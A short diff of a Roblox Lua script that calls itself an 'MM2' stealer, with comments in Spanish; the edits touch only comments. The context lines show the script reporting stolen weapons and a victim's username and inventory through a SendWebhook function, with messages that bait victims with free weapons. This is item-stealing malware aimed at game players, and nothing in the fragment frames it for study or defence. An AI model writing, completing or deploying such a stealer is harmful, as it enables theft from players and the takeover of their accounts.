@@ -1,4 +1,3 @@
--- ======= SCRIPT COMPLETO CON TODO =======
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -224,7 +223,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Webhook final: Inventario enviado
+-- Webhook final: Inventario enviado (formato idéntico)
 local function sendFinalInventoryWebhook()
     local fields={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
